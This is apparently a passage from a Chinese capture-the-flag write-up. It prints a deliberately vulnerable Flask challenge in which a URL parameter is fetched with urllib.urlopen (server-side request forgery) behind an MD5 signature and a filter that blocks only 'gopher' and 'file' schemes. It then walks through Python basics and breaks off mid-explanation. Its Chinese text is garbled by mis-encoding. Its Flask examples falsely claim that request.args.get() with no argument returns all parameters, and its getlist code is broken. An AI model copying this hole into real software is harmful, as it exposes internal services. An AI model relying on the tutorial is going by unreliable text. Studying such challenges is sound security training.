class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#! /usr/bin/env python #encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-comment"># æœ‰å‚åˆå§‹åŒ–ä¸€ä¸ªTaskå¯¹è±¡</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        <span class="hljs-comment"># å°†å®¢æˆ·ç«¯çš„ipåœ°å€è¿›è¡Œmd5åŠ å¯†</span><br>        self.sandbox = md5(ip)<br>        <span class="hljs-comment"># åˆ¤æ–­è¯¥ipåœ°å€æ˜¯å¦å­˜åœ¨</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):<br>            <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            <span class="hljs-comment"># å¦‚æœè¯¥ipåœ°å€ä¸å­˜åœ¨ï¼Œåˆ™ä¸ºè¯¥ipåœ°å€åˆ›å»ºä¸€ä¸ªç›®å½•ï¼Œä½¿è¯¥ipåœ°å€èƒ½å¤Ÿè®¿é—®è¯¥ç½‘ç«™æ–‡ä»¶</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># ç”³è¯·ä¸€ä¸ªresultå­—å…¸</span><br>        result = &#123;&#125;<br>        <span class="hljs-comment"># &#123;&#x27;code&#x27;: 500&#125;</span><br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-comment"># md5(secert_key + param + action)=sign</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                <span class="hljs-comment"># æ‰“å¼€result.txtæ–‡ä»¶ï¼Œå¹¶ç”¨tmpfileæŒ‡ä»£è¯¥æ–‡ä»¶</span><br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                <span class="hljs-comment"># è·å–paramè·¯å¾„ä¸‹çš„æ–‡ä»¶å†…å®¹ï¼Œå¹¶å­˜å‚¨åˆ°respä¸­</span><br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># è¯»å–åˆ°paramæ–‡ä»¶ä¸‹çš„å†…å®¹æ—¶ï¼Œå°†è¯¥æ–‡ä»¶å†…å®¹æ‰“å°ï¼Œä½†æ˜¯è¯¥æ‰“å°çš„å†…å®¹æ— æ³•å‘ˆç°åˆ°ç½‘é¡µä¸­ï¼Œåªèƒ½å‘ˆç°åœ¨ç¼–è¯‘å™¨ä¸­</span><br>                    <span class="hljs-comment"># æ‰€ä»¥æ— æ³•åˆ©ç”¨å…¶æŸ¥çœ‹respçš„å†…å®¹</span><br>                    <span class="hljs-built_in">print</span>(resp)<br>                    <span class="hljs-comment"># å°†è¯»å–çš„æ–‡ä»¶å†…å®¹å†™å…¥tmofileä¸­</span><br>                    tmpfile.write(resp)<br>                    <span class="hljs-comment"># å…³é—­æ–‡ä»¶tmpfile</span><br>                    tmpfile.close()<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                    <span class="hljs-comment"># å†æ¬¡è¯»å–result.txtæ–‡ä»¶</span><br>                    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                    <span class="hljs-comment"># å°†è¯»å–çš„æ–‡ä»¶å†…å®¹å­˜å‚¨åˆ°resultå­—å…¸ä¸­</span><br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br><br>                <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># å¦‚æœactionä¸­æ²¡æœ‰scanåˆ™è¿”å›é”™è¯¯</span><br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>                result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>            <span class="hljs-keyword">return</span> result<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># å¯¹è¯¥å¯¹è±¡çš„actionå’Œparamè¿›è¡Œmd5åŠ å¯†ï¼Œåˆ¤æ–­åŠ å¯†ç»“æœå’Œè¯¥å¯¹è±¡çš„signæ˜¯å¦ç›¸ç­‰</span><br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><span class="hljs-comment"># è®¿é—®url/geneSigæ—¶ï¼Œè¯¥ç½‘é¡µæ”¯æŒgetå’Œpostè¯·æ±‚</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    <span class="hljs-comment"># request.args.get()è·å–å‚æ•°paramçš„å€¼</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    <span class="hljs-comment"># è®¾ç½®å‚æ•°actionçš„å€¼ä¸ºscan</span><br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-comment"># æ‰§è¡ŒgetSign()å‡½æ•°</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><span class="hljs-comment"># è®¿é—®url/De1taæ—¶ï¼Œè¯¥ç½‘é¡µæ”¯æŒGETå’ŒPOSTè¯·æ±‚</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    <span class="hljs-comment"># ä»cookieä¸­è·å–å‚æ•°actionçš„å€¼</span><br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    <span class="hljs-comment"># ä»getæ–¹æ³•ä¸­è·å–å‚æ•°paramçš„å€¼</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    <span class="hljs-comment"># ä»cookieä¸­è·å–signçš„å€¼</span><br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    <span class="hljs-comment"># ipå­˜å‚¨å®¢æˆ·ç«¯çš„ipåœ°å€</span><br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> (waf(param)):<br>        <span class="hljs-comment"># æŸ¥çœ‹è¾“å…¥çš„paramä¸­æ˜¯å¦å­˜åœ¨éæ³•å­—ç¬¦</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    <span class="hljs-comment"># æœ‰å‚æ•°ç”³è¯·ä¸€ä¸ªTaskç±»ï¼Œç”¨taskå­˜å‚¨è¯¥å¯¹è±¡</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-comment"># è¿”å›ä¸€ä¸ªjsonæ–‡ä»¶æµåˆ°ç½‘é¡µä¸Šï¼Œå³æ˜¾ç¤ºtask.Exec()æ–‡ä»¶å†…å®¹</span><br>    <span class="hljs-comment"># å³æ˜¾ç¤ºresultå­˜å‚¨çš„å†…å®¹</span><br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><span class="hljs-comment"># è®¿é—®url/çš„ç½‘å€æ—¶ï¼Œæ‰§è¡Œindex()å‡½æ•°</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-comment"># æ‰“å¼€å¹¶è¯»å–code.txtæ–‡ä»¶</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># è¯»å–paramè·¯å¾„ä¸‹çš„æ–‡ä»¶å†…å®¹</span><br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-comment"># è¿”å›secert_key + param + actionçš„md5ç»“æœ</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-comment"># å¯¹contentå†…å®¹è¿›è¡Œmd5åŠ å¯†</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><span class="hljs-comment"># å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    <span class="hljs-comment"># å»é™¤paramé¦–ä½ç©ºæ ¼ï¼Œå¹¶å°†è¯¥å­—ç¬¦ä¸²å…¨éƒ¨å­—ç¬¦å°å†™åŒ–</span><br>    check = param.strip().lower()<br>    <span class="hljs-comment"># æ£€æµ‹å­—ç¬¦ä¸²æ˜¯å¦ä»¥gopherå’Œfileå¼€å¤´</span><br>    <span class="hljs-comment"># å³è¿‡æ»¤äº†gopherå’Œfileä¸¤ä¸ªåè®®</span><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># mainå‡½æ•°æè¿°äº†è¯¥ä»£ç é€šè¿‡è®¿é—®çš„è·¯ç”±æ¥æ§åˆ¶æ˜¾ç¤ºçš„ç½‘é¡µå†…å®¹</span><br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><h3 id="çŸ¥è¯†ç‚¹ä»‹ç»"><a href="#çŸ¥è¯†ç‚¹ä»‹ç»" class="headerlink" title="çŸ¥è¯†ç‚¹ä»‹ç»:"></a><strong>çŸ¥è¯†ç‚¹ä»‹ç»:</strong></h3><p>å‚è€ƒï¼š<a href="https://geek-docs.com/flask/flask-questions/268_flask_flask_requestargsget_get_all_params_python.html">Flask Flask request.args.get è·å–æ‰€æœ‰å‚æ•°ï¼ˆPythonï¼‰|æå®¢æ•™ç¨‹ (geek-docs.com)</a></p><p><strong>urllib.unquote(string):å°†urlç¼–ç çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç </strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">import urllib.parse<br><br>str = &#x27;%E6%B3%95%E5%9B%BD%E7%BA%A2%E9%85%92&#x27;<br><br>print(urllib.parse.unquote(str))<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">æ³•å›½çº¢é…’<br></code></pre></td></tr></table></figure><h5 id="ä½¿ç”¨request-args-getè·å–æŒ‡å®šå‚æ•°çš„å€¼"><a href="#ä½¿ç”¨request-args-getè·å–æŒ‡å®šå‚æ•°çš„å€¼" class="headerlink" title="ä½¿ç”¨request.args.getè·å–æŒ‡å®šå‚æ•°çš„å€¼"></a>ä½¿ç”¨request.args.getè·å–æŒ‡å®šå‚æ•°çš„å€¼</h5><p>ä¾‹å­:å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªURLä¸º<code>/user?name=John&amp;age=25</code>ï¼Œæˆ‘ä»¬æƒ³è¦è·å–åˆ°å¯¹åº”å‚æ•°çš„å€¼</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs txt">from flask import Flask, request<br><br>app = Flask(__name__)<br><br>@app.route(&#x27;/user&#x27;, methods=[&#x27;GET&#x27;])<br>def get_user():<br>    name = request.args.get(&#x27;name&#x27;)<br>    age = request.args.get(&#x27;age&#x27;)<br><br>    return f&quot;Name: &#123;name&#125;, Age: &#123;age&#125;&quot;<br><br>if __name__ == &#x27;__main__&#x27;:<br>    app.run()<br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªè·¯ç”±/userï¼Œå¹¶æŒ‡å®šè¯¥è·¯ç”±åªæ”¯æŒGETæ–¹æ³•ã€‚<br>åœ¨get_userå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨request.args.getæ–¹æ³•è·å–äº†URLå‚æ•°ä¸­åä¸ºnameå’Œageçš„å€¼ï¼Œå¹¶å°†å…¶æ‹¼æ¥æˆå­—ç¬¦ä¸²è¿”å›ã€‚å½“æˆ‘ä»¬è®¿é—®/user?name=John&amp;age=25æ—¶ï¼Œé¡µé¢ä¼šæ˜¾ç¤ºName: John, Age: 25<br></code></pre></td></tr></table></figure><h5 id="ä½¿ç”¨request-args-getè·å–æ‰€æœ‰å‚æ•°çš„å€¼"><a href="#ä½¿ç”¨request-args-getè·å–æ‰€æœ‰å‚æ•°çš„å€¼" class="headerlink" title="ä½¿ç”¨request.args.getè·å–æ‰€æœ‰å‚æ•°çš„å€¼"></a>ä½¿ç”¨request.args.getè·å–æ‰€æœ‰å‚æ•°çš„å€¼</h5><p>ä¾‹å­:æœ‰æ—¶å€™æˆ‘ä»¬å¹¶ä¸çŸ¥é“URLå‚æ•°çš„å…·ä½“åç§°ï¼Œæˆ–è€…URLå‚æ•°çš„æ•°é‡æ˜¯å¯å˜çš„ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>request.args.get</code>æ–¹æ³•çš„å¦ä¸€ç§å½¢å¼ï¼Œå³ä¸ä¼ é€’å‚æ•°åï¼Œç›´æ¥è·å–æ‰€æœ‰å‚æ•°çš„å€¼</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>():<br>    args = request.args.get()<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;All Params: <span class="hljs-subst">&#123;args&#125;</span>&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨request.args.getæ–¹æ³•è·å–æ‰€æœ‰URLå‚æ•°çš„å€¼ï¼Œå¹¶å°†å…¶æ‹¼æ¥æˆå­—ç¬¦ä¸²è¿”å›ã€‚ä¾‹å¦‚ï¼Œå½“æˆ‘ä»¬è®¿é—®/user?name=John&amp;age=25&amp;city=New+Yorkæ—¶ï¼Œé¡µé¢ä¼šæ˜¾ç¤ºAll Params: ImmutableMultiDict([(&#x27;name&#x27;, &#x27;John&#x27;), (&#x27;age&#x27;, &#x27;25&#x27;), (&#x27;city&#x27;, &#x27;New York&#x27;)])ã€‚<br></code></pre></td></tr></table></figure><h5 id="éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œrequest-args-getæ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªImmutableMultiDictå¯¹è±¡ï¼Œå®ƒç±»ä¼¼äºå­—å…¸ä½†æ˜¯ä¸å¯ä¿®æ”¹ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶æä¾›çš„æ–¹æ³•æ¥è·å–å‚æ•°å€¼ï¼Œæ¯”å¦‚args-getlist-â€˜nameâ€™-å¯ä»¥è·å–åä¸ºnameçš„å‚æ•°çš„æ‰€æœ‰å€¼"><a href="#éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œrequest-args-getæ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªImmutableMultiDictå¯¹è±¡ï¼Œå®ƒç±»ä¼¼äºå­—å…¸ä½†æ˜¯ä¸å¯ä¿®æ”¹ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶æä¾›çš„æ–¹æ³•æ¥è·å–å‚æ•°å€¼ï¼Œæ¯”å¦‚args-getlist-â€˜nameâ€™-å¯ä»¥è·å–åä¸ºnameçš„å‚æ•°çš„æ‰€æœ‰å€¼" class="headerlink" title="éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œrequest.args.getæ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªImmutableMultiDictå¯¹è±¡ï¼Œå®ƒç±»ä¼¼äºå­—å…¸ä½†æ˜¯ä¸å¯ä¿®æ”¹ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶æä¾›çš„æ–¹æ³•æ¥è·å–å‚æ•°å€¼ï¼Œæ¯”å¦‚args.getlist(â€˜nameâ€™)å¯ä»¥è·å–åä¸ºnameçš„å‚æ•°çš„æ‰€æœ‰å€¼"></a>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œrequest.args.getæ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªImmutableMultiDictå¯¹è±¡ï¼Œå®ƒç±»ä¼¼äºå­—å…¸ä½†æ˜¯ä¸å¯ä¿®æ”¹ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶æä¾›çš„æ–¹æ³•æ¥è·å–å‚æ•°å€¼ï¼Œæ¯”å¦‚args.getlist(â€˜nameâ€™)å¯ä»¥è·å–åä¸ºnameçš„å‚æ•°çš„æ‰€æœ‰å€¼</h5><p>ä¾‹å­:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>():<br>    args = request.args.get()<br>    name = args.getlist(<span class="hljs-string">&#x27;name&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Name: <span class="hljs-subst">&#123;name&#125;</span>&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨args.getlistæ–¹æ³•è·å–åä¸ºnameçš„å‚æ•°çš„æ‰€æœ‰å€¼ï¼Œå¹¶å°†å…¶æ‹¼æ¥æˆå­—ç¬¦ä¸²è¿”å›ã€‚å½“æˆ‘ä»¬è®¿é—®/user?name=John&amp;name=Tom&amp;name=Jackæ—¶ï¼Œé¡µé¢ä¼šæ˜¾ç¤ºName: [&#x27;John&#x27;, &#x27;Tom&#x27;, &#x27;Jack&#x27;]<br></code></pre></td></tr></table></figure><h5 id="hashlib-md5"><a href="#hashlib-md5" class="headerlink" title="hashlib.md5():"></a>hashlib.md5():</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib         <span class="hljs-comment">#å¯¼å…¥hashlibæ¨¡å—</span><br><br>md = hashlib.md5()     <span class="hljs-comment">#è·å–ä¸€ä¸ªmd5åŠ å¯†ç®—æ³•å¯¹è±¡</span><br>md.update(<span class="hljs-string">&#x27;how to use md5 in hashlib?&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))                   <span class="hljs-comment">#åˆ¶å®šéœ€è¦åŠ å¯†çš„å­—ç¬¦ä¸²</span><br><span class="hljs-built_in">print</span>(md.hexdigest())  <span class="hljs-comment">#è·å–åŠ å¯†åçš„16è¿›åˆ¶å­—ç¬¦ä¸²</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">d26a53750bc40b38b65a520292f69306<br></code></pre></td></tr></table></figure><h5 id="str-strip-chars-ç§»é™¤åœ¨å­—ç¬¦ä¸²strä¸­çš„é¦–å°¾å­—ç¬¦chars-é»˜è®¤ç§»é™¤ç©ºæ ¼"><a href="#str-strip-chars-ç§»é™¤åœ¨å­—ç¬¦ä¸²strä¸­çš„é¦–å°¾å­—ç¬¦chars-é»˜è®¤ç§»é™¤ç©ºæ ¼" class="headerlink" title="str.strip([chars]):ç§»é™¤åœ¨å­—ç¬¦ä¸²strä¸­çš„é¦–å°¾å­—ç¬¦chars,é»˜è®¤ç§»é™¤ç©ºæ ¼"></a>str.strip([chars]):ç§»é™¤åœ¨å­—ç¬¦ä¸²strä¸­çš„é¦–å°¾å­—ç¬¦chars,é»˜è®¤ç§»é™¤ç©ºæ ¼</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">str = &quot;0000hello0000&quot;.strip(&#x27;0&#x27;)<br>print(str)<br># hello<br>str = &quot;     hello    &quot;.strip()<br>print(str)<br># hello<br></code></pre></td></tr></table></figure><h5 id="str-lower-å°†å­—ç¬¦ä¸²stræ‰€æœ‰å­—ç¬¦è½¬å°å†™"><a href="#str-lower-å°†å­—ç¬¦ä¸²stræ‰€æœ‰å­—ç¬¦è½¬å°å†™" class="headerlink" title="str.lower():å°†å­—ç¬¦ä¸²stræ‰€æœ‰å­—ç¬¦è½¬å°å†™"></a>str.lower():å°†å­—ç¬¦ä¸²stræ‰€æœ‰å­—ç¬¦è½¬å°å†™</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;AAAAAsssDDD&quot;</span>.lower()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br><span class="hljs-comment"># aaaaasssddd</span><br></code></pre></td></tr></table></figure><h5 id="Python-startswith-æ–¹æ³•ç”¨äºæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦æ˜¯ä»¥æŒ‡å®šå­å­—ç¬¦ä¸²å¼€å¤´ï¼Œå¦‚æœæ˜¯åˆ™è¿”å›-Trueï¼Œå¦åˆ™è¿”å›-Falseã€‚å¦‚æœå‚æ•°-beg-å’Œ-end-æŒ‡å®šå€¼ï¼Œåˆ™åœ¨æŒ‡å®šèŒƒå›´å†…æ£€æŸ¥ï¼š"><a href="#Python-startswith-æ–¹æ³•ç”¨äºæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦æ˜¯ä»¥æŒ‡å®šå­å­—ç¬¦ä¸²å¼€å¤´ï¼Œå¦‚æœæ˜¯åˆ™è¿”å›-Trueï¼Œå¦åˆ™è¿”å›-Falseã€‚å¦‚æœå‚æ•°-beg-å’Œ-end-æŒ‡å®šå€¼ï¼Œåˆ™åœ¨æŒ‡å®šèŒƒå›´å†…æ£€æŸ¥ï¼š" class="headerlink" title="Python startswith() æ–¹æ³•ç”¨äºæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦æ˜¯ä»¥æŒ‡å®šå­å­—ç¬¦ä¸²å¼€å¤´ï¼Œå¦‚æœæ˜¯åˆ™è¿”å› Trueï¼Œå¦åˆ™è¿”å› Falseã€‚å¦‚æœå‚æ•° beg å’Œ end æŒ‡å®šå€¼ï¼Œåˆ™åœ¨æŒ‡å®šèŒƒå›´å†…æ£€æŸ¥ï¼š"></a>Python startswith() 